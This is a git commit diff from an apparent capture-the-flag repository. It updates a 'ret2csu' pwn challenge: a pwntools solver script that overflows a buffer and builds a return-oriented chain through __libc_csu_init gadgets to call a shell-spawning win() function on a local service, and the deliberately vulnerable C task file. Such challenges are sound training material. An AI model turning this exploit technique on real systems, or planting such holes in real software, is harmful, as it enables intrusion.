4dbd3b57f118921de325eac4f6e0dbdaccb062e1
dmur1 <93072266+dmur1@users.noreply.github.com>
2025-03-06 20:48:27 +0000

    make ret2csu a bit more reliant on ret2csu

--- pwn/ret2csu/ret2csu/challenge/go.py
+++ pwn/ret2csu/ret2csu/challenge/go.py
@@ -2,30 +2,32 @@
 
 from pwn import *
 
-context.log_level = "debug"
-elf = ELF("./task_patched", checksec=True)
+#context.log_level = "debug"
+elf = ELF("./task_patched", checksec=False)
 context.binary = elf
 
-libc = ELF("./libc.so.6", checksec=True)
-ld = ELF("./ld-linux-x86-64.so.2", checksec=True)
+libc = ELF("./libc.so.6", checksec=False)
+ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
 
 #p = elf.process()
 #p = elf.debug(gdbscript="")
 p = remote("127.0.0.1", 9001)
 
 BSS = 0x404900
-POP = 0x00401234
-CALL = 0x00401218
+POP = 0x401252
+CALL = 0x00401238
 
 rop = ROP(elf)
 rop.raw(b"A" * 0x28)
 rop.gets(BSS)
 rop.raw(POP)
-rop.raw(0)
-rop.raw(0)
-rop.raw(0)
-rop.raw(BSS)
-rop.raw(CALL)
+rop.raw(0)           # POP RBX
+rop.raw(0)           # POP RBP
+rop.raw(0xabcdabcd)  # POP R12 => R12D => EDI => a
+rop.raw(0xfeeffeef)  # POP R13 => RSI => b
+rop.raw(0x12344321)  # POP R14 => RDX => c
+rop.raw(BSS)         # POP R15
+rop.raw(CALL)		 # CALL [R15 + RBX*8]
 
 p.sendline(rop.chain())
 p.sendline(p64(elf.sym["win"]))
--- pwn/ret2csu/ret2csu/challenge/task.c
+++ pwn/ret2csu/ret2csu/challenge/task.c
@@ -1,8 +1,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-void win() {
-    system("/bin/sh");
+void win(int a, int b, int c) {
+    if (a == 0xabcdabcd && b == 0xfeeffeef && c == 0x12344321) {
+        system("/bin/sh");
+    }
 }
 
 void setup() {
